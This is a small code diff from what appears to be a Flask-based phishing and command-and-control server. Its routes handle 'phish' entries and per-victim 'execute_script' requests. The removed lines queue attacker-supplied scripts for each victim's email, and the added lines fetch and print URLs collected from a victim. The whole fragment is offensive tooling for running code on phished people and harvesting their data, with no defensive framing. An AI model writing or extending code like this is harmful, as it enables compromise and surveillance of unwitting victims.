@@ -189,10 +189,12 @@ def add_phish(email):
 @app.route("/execute_script/<email>", methods=['GET', 'POST'])
 def execute_script(email):
     if request.method == 'POST':
-        script = request.form['execute-script']
-        oldList = executeQueue.get(str(email), [])
-        oldList.append(str(script))
-        executeQueue[str(email)] = oldList
+        # script = request.form['execute-script']
+        # oldList = executeQueue.get(str(email), [])
+        # oldList.append(str(script))
+        # executeQueue[str(email)] = oldList
+        victim_urls = victim.getFromVictim(email)
+        print list(victim_urls)
         return redirect(url_for('view_user', email=email))
     elif request.method == 'GET':
         #print "EMAIL:", str(email)
